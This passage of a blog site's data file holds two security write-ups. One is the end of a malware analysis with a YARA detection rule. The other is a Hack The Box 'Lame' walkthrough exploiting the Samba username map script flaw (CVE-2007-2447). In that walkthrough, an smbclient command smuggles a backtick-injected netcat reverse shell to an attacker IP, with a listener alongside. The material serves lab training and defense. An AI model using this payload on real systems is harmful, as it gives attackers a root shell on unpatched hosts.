            explanation: 'Sections with entropy approaching 8.0 confirm that the payload is compressed or encrypted.'
          }
        ]
      },
      {
        id: 'iat-analysis',
        title: 'Phase 2: Import Address Table (IAT) Triage',
        content: 'We inspect imported functions from `kernel32.dll`. The sample imports sensitive memory allocation and process injection functions.',
        snippets: [
          {
            id: 'iat-imports',
            language: 'bash',
            title: 'Suspicious API Calls Identified in Sample',
            code: `# Key suspicious functions detected in IAT:
- VirtualAlloc (0x00402010)
- WriteProcessMemory (0x00402028)
- CreateRemoteThread (0x0040203C)
- URLDownloadToFileA (0x00402050)`,
            explanation: 'The combination of URLDownloadToFileA with CreateRemoteThread strongly matches dropper and injector behaviors.'
          }
        ]
      },
      {
        id: 'yara-rule',
        title: 'Phase 3: Crafting a Production-Grade YARA Detection Rule',
        content: 'We translate our static indicators and byte patterns into a resilient YARA rule.',
        snippets: [
          {
            id: 'sample-yara-rule',
            language: 'yara',
            title: 'Defensive YARA Rule for Dropper Variant',
            code: `rule 8WHIE_Dropper_Generic_Detection {
    meta:
        description = "Detects educational multi-stage dropper variant with unbacked injection"
        author = "Aryan Thakur (8WHIE Cyber Security Labs)"
        date = "2026-01-15"
        reference = "8WHIE-MAL-2026-001"
        severity = "High"

    strings:
        // Magic sequence observed in decryption routine
        $magic_stub = { 55 89 E5 83 EC 18 C7 45 ?? ?? ?? ?? ?? 8B 45 ?? 31 C0 }
        // Characteristic domain string or user agent
        $user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) 8WHIE-Sandbox" fullword ascii

    condition:
        // Must be a valid PE file
        uint16(0) == 0x5A4D and
        uint32(uint32(0x3C)) == 0x00004550 and
        filesize < 2MB and
        ($magic_stub or $user_agent)
}`,
            explanation: 'This rule ensures high precision and avoids false positives by validating both file format magic numbers and specific payload byte sequences.'
          }
        ]
      }
    ]
  },
  {
    id: 'htb-lame',
    slug: 'htb-lame-samba-remote-command-execution',
    title: 'Lame: Legacy Samba usermap script Command Injection',
    machineName: 'Lame',
    platform: 'Hack The Box',
    category: 'linux',
    difficulty: 'Easy',
    date: '2026-01-08',
    readTime: '11 min read',
    author: 'Aryan Thakur',
    authorRole: 'Founder & Lead Security Researcher, 8WHIE',
    summary: 'A classic beginner-friendly Linux walkthrough exploring Samba 3.0.20 on port 139/445, exploiting the legendary username map script vulnerability (CVE-2007-2447) to achieve instantaneous root access.',
    targetIp: '10.10.10.3',
    os: 'Linux',
    tags: ['Linux', 'Samba', 'Remote Command Injection', 'Hack The Box', 'CVE-2007-2447', 'Easy'],
    cveReferences: ['CVE-2007-2447'],
    mitreAttack: [
      { tactic: 'Initial Access', techniqueId: 'T1190', techniqueName: 'Exploit Public-Facing Application' },
      { tactic: 'Execution', techniqueId: 'T1059.004', techniqueName: 'Command and Scripting Interpreter: Unix Shell' }
    ],
    prerequisites: ['Samba service fundamentals', 'Understanding Netcat / shell execution', 'Nmap service version scanning'],
    keyTakeaways: [
      'Older Samba versions passed unsanitized usernames directly into MS-RPC script execution directives.',
      'Shell metacharacters like backticks (``) inside SMB login attempts execute commands under the daemon user (root).',
      'Always patch and retire legacy SMB protocols.'
    ],
    remediationAdvice: 'Upgrade Samba to a supported release and remove `username map script` options from smb.conf.',
    isFeatured: false,
    sections: [
      {
        id: 'lame-recon',
        title: 'Phase 1: Network Service Enumeration',
        content: 'Running an Nmap scan reveals open ports 21 (vsftpd 2.3.4), 22 (OpenSSH 4.7p1), 139 (netbios-ssn), and 445 (Samba 3.0.20-Debian).',
        snippets: [
          {
            id: 'lame-nmap',
            language: 'bash',
            title: 'Samba Service Version Probe',
            code: 'nmap -sV -p 139,445 --script smb-os-discovery 10.10.10.3',
            explanation: 'Reveals Samba version 3.0.20, an old release vulnerable to command injection.'
          }
        ]
      },
      {
        id: 'lame-exploit',
        title: 'Phase 2: Manual SMB Command Injection Exploitation',
        content: 'We can exploit CVE-2007-2447 without heavy frameworks by passing backtick shell syntax directly using smbclient.',
        snippets: [
          {
            id: 'smbclient-exploit',
            language: 'bash',
            title: 'Exploiting username map script via smbclient',
            code: `# On our attacking host, start listener on port 4444
nc -lvnp 4444

# Connect to the target SMB share injecting backtick commands in the logon username:
smbclient //10.10.10.3/tmp -U 'nohost' --password='' -c 'logon "/=\`nohup nc -e /bin/sh 10.10.14.5 4444\`"'`,
            explanation: 'Samba passes the username string to the system shell, executing our Netcat reverse connection instantly as root (uid=0).'
          }
        ]
      }
    ]
  }
];
